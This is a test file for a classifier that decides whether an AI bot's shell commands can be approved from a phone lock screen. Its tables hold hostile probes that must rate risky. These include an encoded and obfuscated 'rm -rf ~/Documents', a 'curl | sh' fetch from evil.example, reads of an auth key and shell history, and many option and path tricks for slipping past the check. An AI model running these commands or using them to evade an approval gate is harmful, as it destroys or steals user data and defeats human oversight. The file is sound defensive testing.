// B1 (review fix round 1): the reviewer's 110-input probe as a table. Low is
// an allowlist outcome: every interpreter form and every obfuscated form is
// risky, and the legitimate read-only commands stay low. Each row goes
// through the classifier, the revision re-rate and the lock-screen respond.
import { DatabaseSync } from "node:sqlite";
import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it, vi } from "vitest";
import { pushRiskFor, ratePushRevision, workspaceInside } from "./mobile-push-risk.ts";
import { LOW_COMMANDS, isReadOnlyCommand } from "./mobile-push-readonly.ts";
import { respondFromPush } from "./mobile-push-respond.ts";
import { PushStore, initializeMobilePush } from "./mobile-push-store.ts";

const B64 = "cm0gLXJmIH4vRG9jdW1lbnRz";
const INTERPRETERS: string[] = [
  // inline eval
  `python3 -c "open('/home/review/Documents/report.txt', 'w').write('replacement')"`, // Astra's exact input
  `python -c "open('/x','w')"`, `python2 -c "x=1"`, `node -e "require('fs').writeFileSync('/x','y')"`, `node -p "require('fs').writeFileSync('/x','y')"`,
  `node --print "require('fs').writeFileSync('/x','y')"`, `node --eval="require('fs').writeFileSync('/x','y')"`, `node -pe "require('fs').writeFileSync('/x','y')"`,
  `nodejs -e "x"`, `ruby -e "File.write('/x','y')"`, `ruby -ne "File.write('/x','y')"`, `perl -e 'open(F,">/x")'`, `perl -E 'say 1'`, `perl -le 'print 1'`,
  `perl -ne 'print' f`, `php -r 'file_put_contents("/x","y");'`, `osascript -e 'tell application "Finder" to delete x'`, `bun -e "x"`, `deno eval "x"`,
  `bash -c 'cp a b'`, `sh -c 'cp a b'`, `zsh -c 'cp a b'`, `bash -lc 'cp a b'`, `sh -ec 'cp a b'`, `fish -c 'cp a b'`, `tcsh -c 'cp a b'`,
  `pwsh -c 'Set-Content x y'`, `pwsh -EncodedCommand ${B64}`, `pwsh -enc ${B64}`, `powershell -ec ${B64}`, `powershell -Command 'Set-Content x y'`,
  `Rscript -e 'writeLines("y","/x")'`, `ts-node -e "x"`, `npx tsx -e "x"`, `lua -e "os.execute('cp a b')"`,
  // versions, absolute paths, combined flags
  `python3.12 -c "open('/x','w')"`, `/opt/homebrew/bin/python3.12 -c "open('/x','w')"`, `/usr/bin/python3 -c "open('/x','w')"`, `python3 -Ic "open('/x','w')"`,
  // wrappers
  `nice -n 5 python3 -c "open('/x','w')"`, `timeout 10 python3 -c "open('/x','w')"`, `command -p python3 -c "open('/x','w')"`, `arch -arm64 python3 -c "open('/x','w')"`,
  `caffeinate -i python3 -c "open('/x','w')"`, `uv run python -c "open('/x','w')"`, `env python3 -c "open('/x','w')"`, `env -i python3 -c "open('/x','w')"`,
  `FOO=1 python3 -c "open('/x','w')"`,
  // xargs, find -exec
  `ls | xargs -0 python3 -c "open('/x','w')"`, `ls | xargs -I{} sh -c 'cp {} /x'`, `find . -exec sh -c 'cp "$1" /x' _ {} ;`,
  // source
  `source ./setup.sh`, `source ~/evil.sh`, `. ./setup.sh`,
  // stdin, here-string, here-document
  `python3 <<< "open('/x','w').write('y')"`, `bash <<< "cp a /x"`, "python3 - <<'EOF'\nopen('/x','w').write('y')\nEOF", `python3 < /tmp/payload.py`,
  // script files
  `deno run -A ./x.ts`, `cat x.py | python3`, `echo "x" | python3 -`, `base64 -d | sh`,
];
const OBFUSCATED: string[] = [
  `$(echo ${B64} | base64 -d)`, `\`echo ${B64} | base64 -d\``, `bash <<< "$(echo ${B64} | base64 -d)"`,
  `r''m -rf ~/Documents`, `"r"m -rf ~/Documents`, `r\\m -rf ~/Documents`, `x=r; \${x}m -rf ~/Documents`, `$(printf '\\x72\\x6d') -rf ~/Documents`,
  `c\\p ~/.zshrc /x`, `"c"p a /etc/x`, `eval "$(echo ${B64} | base64 -d)"`, `xxd -r -p <<< 726d | sh`, `python3 -c "$(echo ${B64} | base64 -d)"`, `echo ${B64} | base64 -d | bash`,
];
const SCRIPTS: string[] = [`python3 evil.py`, `bash build.sh`, `node tool.js`, `./deploy.sh`, `ruby tool.rb`];
// Round 2 final allowlist: pure readers with exact options. Git, go, yarn, cargo,
// npx, tsc, file, hostname, date and sort are not low (they read repo or
// project configuration the bot can write, or can write or run something).
const LEGIT: string[] = [
  "ls -la", "ls", "cat package.json", "head -20 file", "head -n 5 file", "tail -n 5 log.txt", "wc -l file", "pwd", "echo hello", `echo "a -c b"`,
  "grep -rn foo src", "grep -n ab file", "rg foo", "rg -n foo src", "find . -name x", "find . -type f -maxdepth 2", "stat -x file", "du -sh .",
  "df -h", "which node", "tree -L 2", "printf hi", "ls | head", "ls src", "sed -n 1,20p file",
  
];
// Test runners execute project code the bot may have just edited: the same
// class as `python3 evil.py`, so risky (coordinator ruling).
const TEST_RUNNERS = ["npm test", "pnpm test", "yarn test", "pytest -q", "cargo test", "cargo check", "go test ./...", "npx vitest run", "pnpm vitest run", "npx jest", "npm test 2>&1 | tail"];

// Round 2: the re-review's bypass table (every probe of the second review), all risky.
const BYPASSES: Array<[string, string]> = [
  ["quote in head", "'ls' -la"],
  ["empty quotes in head", "l''s"],
  ["dq head", "\"ls\""],
  ["ansi-c", "echo $'\\x41'"],
  ["backslash", "l\\s"],
  ["backslash-newline", "ls \\\n-la"],
  ["glob head", "l? -la"],
  ["brace", "echo {a,b}"],
  ["glob arg plain", "ls *"],
  ["glob arg git", "git diff *"],
  ["glob arg sort", "sort *"],
  ["var arg git", "git diff $X"],
  ["IFS assign", "IFS=x; ls"],
  ["alias", "alias ls=x; ls"],
  ["function", "f() { ls; }; f"],
  ["command", "command ls"],
  ["builtin", "builtin echo"],
  ["exec", "exec ls"],
  ["time", "time ls"],
  ["bang", "! ls"],
  ["git -c", "git -c core.pager=x log"],
  ["git --exec-path", "git --exec-path=x status"],
  ["git -C", "git -C /x status"],
  ["git log --output", "git log --output=x"],
  ["git log quoted --output", "git log \"--output=x\""],
  ["git log abbrev --outp", "git log --outp=x"],
  ["git diff abbrev --out", "git diff --out=x"],
  ["git diff --ext-diff", "git diff --ext-diff"],
  ["git show --ext-diff", "git show --ext-diff"],
  ["git diff --textconv", "git diff --textconv"],
  ["git cat-file --textconv", "git cat-file --textconv HEAD:x"],
  ["git cat-file --filters", "git cat-file --filters HEAD:x"],
  ["git diff plain (honors diff.external)", "git diff"],
  ["git status (honors core.fsmonitor)", "git status"],
  ["git grep -O", "git grep -O x"],
  ["git grep --open-files-in-pager", "git grep --open-files-in-pager x"],
  ["git grep abbrev --open-files", "git grep --open-files x"],
  ["git alias via -c", "git -c alias.x=y x"],
  ["git branch create", "git branch newb"],
  ["git tag create", "git tag v1"],
  ["git config set", "git config a.b c"],
  ["git stash push", "git stash"],
  ["git remote add", "git remote add o x"],
  ["less", "less x"],
  ["more", "more x"],
  ["man", "man ls"],
  ["find -fprint", "find . -fprint x"],
  ["find -fprintf", "find . -fprintf x y"],
  ["find -exec", "find . -exec ls ;"],
  ["find -delete", "find . -delete"],
  ["find -fls", "find . -fls x"],
  ["sort -o", "sort -o x y"],
  ["sort -uo", "sort -uo x y"],
  ["sort --output", "sort --output=x y"],
  ["sort abbrev --outp", "sort --outp=x y"],
  ["sort --compress-program", "sort --compress-program=x -S 1 y"],
  ["tee", "tee x"],
  ["awk", "awk 1 x"],
  ["sed e cmd", "sed -n 1e x"],
  ["sed w", "sed -n 'w x' y"],
  ["sed s///w", "sed -n 's/a/b/w x' y"],
  ["sed -i", "sed -i s/a/b/ x"],
  ["sed -e", "sed -e p x"],
  ["xxd -r", "xxd -r x"],
  ["env assign", "FOO=x ls"],
  ["PAGER", "PAGER=x git log"],
  ["GIT_PAGER", "GIT_PAGER=x git log"],
  ["GIT_EXTERNAL_DIFF", "GIT_EXTERNAL_DIFF=x git diff"],
  ["procsub <(", "diff <(ls) x"],
  ["procsub >(", "ls >(cat)"],
  ["redir file", "ls > x"],
  ["append", "ls >> x"],
  ["redir clobber", "ls >| x"],
  ["redir &>", "ls &> x"],
  ["fd close", "ls >&-"],
  ["background", "ls & ls"],
  ["|&", "ls |& cat"],
  ["subshell", "(ls)"],
  ["$(", "echo $(ls)"],
  ["backtick", "echo `ls`"],
  ["arith", "echo $((1))"],
  ["heredoc", "cat <<E"],
  ["here-string", "cat <<< x"],
  ["homoglyph fullwidth", "\uff4c\uff53"],
  ["homoglyph cyrillic", "l\u0455"],
  ["NUL in head", "ls\u0000x"],
  ["NUL in arg", "cat a\u0000b"],
  ["CR split", "ls\r-la"],
  ["nbsp", "ls\u00a0-la"],
  ["comment", "ls # x"],
  ["go list -toolexec", "go list -export -toolexec=x ./..."],
  ["cargo metadata --config", "cargo metadata --config x"],
  ["cargo tree", "cargo tree"],
  ["yarn list (yarnPath)", "yarn list"],
  ["pnpm ls (pnpmfile)", "pnpm ls"],
  ["npm ls", "npm ls"],
  ["npm view", "npm view x"],
  ["npx tsc --noEmit", "npx tsc --noEmit"],
  ["tsc --noEmit", "tsc --noEmit"],
  ["npm test", "npm test"],
  ["pytest", "pytest"],
  ["cargo test", "cargo test"],
  ["go test", "go test"],
  ["file -C -m", "file -C -m x"],
  ["date --se abbrev", "date --se x"],
  ["hostname set", "hostname x"],
  ["rg --pre", "rg --pre x y"],
  ["rg --pre=", "rg --pre=x y"],
  ["tree -o", "tree -o x"],
  ["uniq out file", "uniq a b"],
  ["ps e", "ps eww"],
  ["jq $ENV", "jq -n '$ENV'"],
  ["jq env", "jq -n env"],
];
const NOT_LEGIT_ANYMORE = [...TEST_RUNNERS, "git commit -m 'fix -e handling'", "git status", "git diff", "git log", "git rev-parse HEAD", "sort a", "date", "hostname", "file x", "ps aux", "python3 manage.py check", "sed -i 's/a/b/' f", "find . -delete", "find . -exec ls {} ;", "git branch -D x", "echo x > out.txt", "git -C /tmp status"];

// R2-2: what a read-only command reads must be inside the workspace. A relative
// path resolves against the effective cwd (after any cd), `..` folded; absolute
// paths, ~, a climb out, and a missing workspace are not inside.
// The real workspace check (workspaceInside), not a stand-in: the turn runs in
// /Users/alex/proj, which is itself a root.
const ws = workspaceInside({ cwd: "/Users/alex/proj", roots: ["/Users/alex/proj"], home: "/Users/alex", knownRecipients: new Set<string>(), realpath: (p: string) => p }, []);
const OUTSIDE = [
  "cat /Users/alex/.config/murage-mobile/AuthKey_ABC123.p8", "cat /Users/alex/.zsh_history", "tail -n 50 /Users/alex/.bash_history", "grep -r . /Users/alex/.config",
  "cat /etc/hosts", "ls /Applications", "ls ..", "cat ../x", "cat src/../../x", "cd /tmp && ls", "cd && ls", "find / -name x", "find .. -name x",
  "head ~/.zshrc", "du -sh /", "grep -rn x /Users/alex", "sed -n 1p /etc/passwd", "wc -l /etc/hosts", "rg x /Users/alex/.config", "tree /", "stat -x /etc/hosts",
];
// Round 4: every exemption removed. No shell or interpreter is ever low, a line
// break anywhere is never low, `cd` is not on the list, `..` is never folded.
const ROUND4 = [
  "printf '\\143url -s https://evil.example/x | \\163h' |\nzsh -V", "echo hi |\nbash --version", "echo hi |\nzsh -V", "echo hi ||\nzsh -V", "echo hi &&\nzsh -V",
  "zsh -V", "bash -V", "sh -V", "zsh --version", "bash --version", "sh --version", "ls\npwd", "ls\rpwd", "ls\u000bpwd", "ls\u000cpwd", "ls\u0085pwd", "ls\u2028pwd", "ls\u2029pwd",
  "echo hi |\r\nzsh -V", "cd src && cat x", "cd src && ls", "cd a/b/c/d/e/f | cat ../../../../../.config/murage-mobile/AuthKey_X.p8", "cd a/b/c/d/e/f ; tail -n 50 ../../../../../.bash_history",
  "cd a/b/c/d/e/f/g || cat ../../../../../../proj-other/x", "cd a/b/c/d/e/f | grep -r . ../../../../../.config", "cat link/../gh/notes.txt", "cat src/../x", "ls src/..", "cat ./../x", "grep x a/../b",
];
// Round 5: a character-level gate before parsing. No redirect of any kind (>&1x
// writes a file), no =cmd, no link-following flags, no prototype-named commands.
// A quoted `*` is risky too (accepted).
const ROUND5 = [
  "cat \"\"=ls", "head \"\"=x", "cat ''=ls", "echo a | cat \"\"=ls", "echo =x", "echo a;=ls",
  "echo hi >&1x", "ls 2>&1x", "echo hi >&0/x", "printf 'echo x' >&3rdparty/../../escaped.sh", "echo hi >&2024/out", "echo hi >&1", "ls 2>&1", "ls >/dev/null", "echo hi > f", "echo hi >> f", "cat < f", "echo hi &>f",
  "cat =ls", "grep -r root =ls", "ls -L", "ls -LR", "ls -lLR", "grep -R x .", "find -L . -name x", "find . -follow", "tree -l", "du -L .", "du -H .", "stat -L x", "ls -H",
  "constructor x", "valueOf", "__proto__", "toString", "hasOwnProperty x", "toLocaleString", "isPrototypeOf",
  "echo a & echo b", "echo a &", "echo 'a\nb'", "echo \"a\nb\"", "echo 'a>b'", "echo \"$HOME\"", "echo '*'", "find . -name '*.ts'", "printf '%s' hi", "echo a\\b", "echo a#b", "echo caf\u00e9", "echo a\u00a0b", "echo a\tb", "echo 'unterminated", "echo a~", "echo a!", "echo a^b", "echo (a)", "echo {a}", "echo [a]", "echo a?", "echo `x`", "echo $(x)",
];
const TOOLCHAIN_VERSIONS = ["python --version", "python3 -V", "node --version", "ruby -V", "perl -V", "php --version", "java --version", "pip --version", "pip3 --version", "rustc --version", "npm --version", "cd x && rustc --version"];

const rows: Array<[string, string]> = [...INTERPRETERS.map((c) => ["interpreter", c] as [string, string]), ...OBFUSCATED.map((c) => ["obfuscated", c] as [string, string]), ...SCRIPTS.map((c) => ["script", c] as [string, string])];

function rateAll(command: string, inside: (p: string) => boolean = ws) {
  const engine = pushRiskFor(null, "Bash", "Run a command", { input: { command }, inside });
  const summary = pushRiskFor(null, "Bash", command, { inside });
  const card = pushRiskFor(null, "Bash", command, { cardOnly: true, inside });
  return { engine, summary, card };
}

describe("B1 allowlist: the reviewer's probe table", () => {
  it("has the reviewer's counts", () => {
    expect(INTERPRETERS.length).toBeGreaterThanOrEqual(62);
    expect(OBFUSCATED.length).toBe(14);
    expect(LEGIT.length).toBeGreaterThanOrEqual(25);
  });
  it.each(rows)("%s %j is risky however it is rated", (_group, command) => {
    const { engine, summary, card } = rateAll(command, ws);
    expect([engine, summary, card]).toEqual(["risky", "risky", "risky"]);
  });
  it.each(LEGIT)("%j stays low however it is rated", (command) => {
    const { engine, summary, card } = rateAll(command, ws);
    expect([engine, summary, card]).toEqual(["low", "low", "low"]);
  });
  it.each(NOT_LEGIT_ANYMORE)("%j is not read-only, so risky", (command) => {
    expect(pushRiskFor(null, "Bash", command, { input: { command }, inside: ws })).toBe("risky");
  });
  it("an unparseable line fails closed", () => {
    for (const command of ["echo 'unterminated", 'echo "unterminated', "ls \\", "ls $(", "ls &", "(ls)", "{ ls; }", "ls <<EOF"]) {
      expect(pushRiskFor(null, "Bash", command)).toBe("risky");
    }
  });
});

describe("B1 allowlist round 2: the re-review's bypass table", () => {
  it.each(BYPASSES)("%s: %j is risky", (_label, command) => {
    expect(isReadOnlyCommand(command)).toBe(false);
    const { engine, summary, card } = rateAll(command, ws);
    expect([engine, summary, card]).toEqual(["risky", "risky", "risky"]);
  });
  it("abbreviated options, globs and variables in arguments are not read-only", () => {
    for (const command of ["ls *", "find . *", "rg x *", "cat $F", "grep -rn x ~/src", "head --li=3 f", "grep --max=3 x f", "ls --al", "echo hi > $X", "cat a\u0000b", "ls\r-la", "find . -name x -- -delete", "ls -- -la", "printf '%n' x", "printf -v x y", "rg --hostname-bin=x y", "grep -f pats f", "rg -f pats", "tree -o x", "du --files0-from=x", "stat -f %N x"]) {
      expect(isReadOnlyCommand(command), command).toBe(false);
    }
  });
  it("the low allowlist is exactly these commands", () => {
    expect([...LOW_COMMANDS].sort()).toEqual(["cat", "df", "du", "echo", "find", "grep", "head", "ls", "printf", "pwd", "rg", "sed", "stat", "tail", "tree", "wc", "which"]);
  });
});

describe("B1 allowlist round 3", () => {
  it.each(OUTSIDE)("%j reads outside the workspace, so risky", (command) => {
    expect(pushRiskFor(null, "Bash", command, { input: { command }, inside: ws })).toBe("risky");
    expect(isReadOnlyCommand(command, ws)).toBe(false);
  });
  it.each(["cat a/b", "ls ./src", "grep -rn x src lib", "rg -e foo src", "find src -name x", "tail -n 5 log"])("%j reads inside, so low", (command) => {
    expect(pushRiskFor(null, "Bash", command, { input: { command }, inside: ws })).toBe("low");
  });
  it("with no workspace a file-system reader is risky, and echo is low", () => {
    expect(isReadOnlyCommand("ls")).toBe(false);
    expect(isReadOnlyCommand("pwd")).toBe(false);
    expect(isReadOnlyCommand("echo hi")).toBe(true);
    expect(pushRiskFor(null, "Bash", "ls", { input: { command: "ls" } })).toBe("risky");
  });
  it.each(ROUND5)("%j is risky (round 5)", (command) => {
    expect(isReadOnlyCommand(command, ws)).toBe(false);
    expect(pushRiskFor(null, "Bash", command, { input: { command }, inside: ws })).toBe("risky");
  });
  it("plain reads, one line, quotes balanced, stay low (legitimate cases)", () => {
    for (const command of ["ls", "cat package.json", "grep -rn foo src", "find . -name x -type f", "ls -la | head -5", "echo 'a b' ; pwd", "grep -n 'foo bar' src/a.ts && ls src"]) {
      expect(pushRiskFor(null, "Bash", command, { input: { command }, inside: ws }), command).toBe("low");
    }
  });
  it.each(ROUND4)("%j is risky (round 4)", (command) => {
    expect(isReadOnlyCommand(command, ws)).toBe(false);
    expect(pushRiskFor(null, "Bash", command, { input: { command }, inside: ws })).toBe("risky");
  });
  it("the workspace root itself is inside for reads (real check)", () => {
    for (const command of ["ls", "ls -la", "cat package.json", "grep -rn x src", "ls .", "find . -name x"]) {
      expect(pushRiskFor(null, "Bash", command, { input: { command }, inside: ws }), command).toBe("low");
    }
  });
  it.each(TOOLCHAIN_VERSIONS)("%j runs a version-manager proxy, so risky", (command) => {
    expect(isReadOnlyCommand(command, ws)).toBe(false);
  });
  it("tail -f and -F never end, so risky", () => {
    expect(isReadOnlyCommand("tail -f log", ws)).toBe(false);
    expect(isReadOnlyCommand("tail -F log", ws)).toBe(false);
  });
});

describe("B1 allowlist round 6: a symlink named - (real filesystem)", () => {
  it("head, tail, wc, ls and tree on - resolve through the link, so risky when it points out", () => {
    const base = realpathSync(mkdtempSync(join(tmpdir(), "r6-")));
    try {
      mkdirSync(join(base, "ws")); mkdirSync(join(base, "secret"));
      writeFileSync(join(base, "secret", "k"), "x");
      symlinkSync(join(base, "secret"), join(base, "ws", "-"));
      symlinkSync(join(base, "secret"), join(base, "ws", "lnk"));
      const real = workspaceInside({ cwd: join(base, "ws"), roots: [join(base, "ws")], home: base, knownRecipients: new Set<string>(), realpath: (p: string) => realpathSync(p.startsWith("/") ? p : join(base, "ws", p)) }, []);
      for (const command of ["head -", "tail -", "wc -", "ls -", "tree -", "cat -", "ls lnk", "ls lnk/", "tree lnk"]) {
        expect(pushRiskFor(null, "Bash", command, { input: { command }, inside: real }), command).toBe("risky");
      }
      rmSync(join(base, "ws", "-"));
      expect(pushRiskFor(null, "Bash", "cat -", { input: { command: "cat -" }, inside: real })).toBe("low");
    } finally { rmSync(base, { recursive: true, force: true }); }
  });
});

describe("B1 allowlist: through re-rate and respond", () => {
  const BINDING = "3f6c1a52-8d1e-4b7a-9c2e-5a0d7e41b9f3";
  function fresh() {
    const db = new DatabaseSync(":memory:");
    db.exec("PRAGMA foreign_keys=ON");
    initializeMobilePush(db);
    const store = new PushStore(db);
    store.putBinding({ bindingId: BINDING, deviceId: "d1", publisherToken: "murage_pt_x", createdAt: 1 });
    store.insertEvent({ eventRef: "a".repeat(64), bindingId: BINDING, kind: "approval", category: "approval", botId: "lena", threadId: "t1", requestId: "req-1",
      messageId: "m1", collapseKey: "c".repeat(32), threadGroup: "g".repeat(16), revision: 1, timeSensitive: true, resolvedBy: null,
      createdAt: 0, expiresAt: 10_000, holdUntil: 0, state: "sent", attempts: 1, nextAttemptAt: 0 });
    return store;
  }
  const allow = (store: PushStore) => respondFromPush({ deviceId: "d1", bindingId: BINDING, body: { requestId: "req-1", decision: "allow", revision: 1 } },
    { store, now: () => 5000, visible: () => true, liveRating: () => "low", card: () => ({ pending: true }), answer: vi.fn(async () => "allowed-once"), log: () => {} });

  const astra = `python3 -c "open('/home/review/Documents/report.txt', 'w').write('replacement')"`;
  it("Astra's input is rated risky at engine time, stays risky on re-rate, and the lock-screen Allow needs step-up", async () => {
    const store = fresh();
    const risk = pushRiskFor(null, "Bash", astra, { input: { command: astra }, inside: () => false });
    store.rateRisk("t1", "req-1", risk, 1);
    const rated = ratePushRevision(store, "t1", "req-1", 1, { stopHit: null, tool: "Bash", summary: astra, inside: () => false }, 2);
    expect(rated).toBe("risky");
    expect((await allow(store)).status).toBe(403);
  });
  it("a bare-name script rated by the engine stays risky, and a card re-rate never lowers it", async () => {
    const store = fresh();
    store.rateRisk("t1", "req-1", pushRiskFor(null, "Bash", "python3 evil.py", { input: { command: "python3 evil.py" } }), 1);
    expect(ratePushRevision(store, "t1", "req-1", 1, { stopHit: null, tool: "Bash", summary: "ls" }, 2)).toBe("risky");
    expect((await allow(store)).status).toBe(403);
  });
  it("a card whose tool input was cut is risky at engine time and on re-rate, so lock-screen Allow needs step-up", async () => {
    expect(pushRiskFor(null, "Bash", "ls", { input: { command: "ls" }, inside: ws, truncated: true })).toBe("risky");
    expect(pushRiskFor(null, "Bash", "ls", { cardOnly: true, inside: ws, truncated: true })).toBe("risky");
    const store = fresh();
    store.rateRisk("t1", "req-1", "low", 1);
    expect(ratePushRevision(store, "t1", "req-1", 1, { stopHit: null, tool: "Bash", summary: "ls", inside: ws, truncated: true }, 2)).toBe("risky");
    expect((await allow(store)).status).toBe(403);
  });
  it("a read-only command stays low through all three and Allow works", async () => {
    const store = fresh();
    store.rateRisk("t1", "req-1", pushRiskFor(null, "Bash", "ls", { input: { command: "ls" }, inside: ws }), 1);
    expect(ratePushRevision(store, "t1", "req-1", 1, { stopHit: null, tool: "Bash", summary: "ls", inside: ws }, 2)).toBe("low");
    expect((await allow(store)).status).toBe(200);
  });
});
